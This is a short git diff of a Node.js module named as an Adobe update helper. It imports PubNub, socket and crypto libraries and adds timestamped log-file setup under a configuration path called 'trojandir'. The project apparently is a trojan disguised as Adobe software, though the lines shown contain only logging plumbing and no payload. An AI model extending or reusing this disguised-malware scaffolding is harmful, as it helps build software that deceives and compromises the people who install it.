@@ -1,5 +1,3 @@
-// const helper_config = require("./adobeupdate.helper.config.js");
-
 const path = require("path");
 const PubNub = require("pubnub");
 const net = require("net");
@@ -9,6 +7,7 @@ const os = require("os");
 const crypto = require("crypto");
 const util = require("util");
 
+var scriptts = "";
 var logfpath = "";
 
 const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
@@ -396,6 +395,23 @@ module.exports = {
     logfpath,
     fileExists,
     writeTag,
+    scriptts,
+    isAsyncFunction,
 };
 
 const helper_ps = require("./adobeupdate.helper.ps.js");
+const helper_config = require("./adobeupdate.helper.config.js");
+
+scriptts = getTimestamp();
+
+logfpath = (() => {
+    let tcmdtaskname = helper_ps.getcmdtaskname();
+    let tcmdname = helper_ps.getcmdname();
+
+    tcmdtaskname = !isNullOrWhitespace(tcmdtaskname) ? "_" + tcmdtaskname : "";
+
+    return path.join(
+        helper_config.systemconfig.trojandir,
+        `master_${tcmdname}${tcmdtaskname}_${scriptts}.log`
+    );
+})();
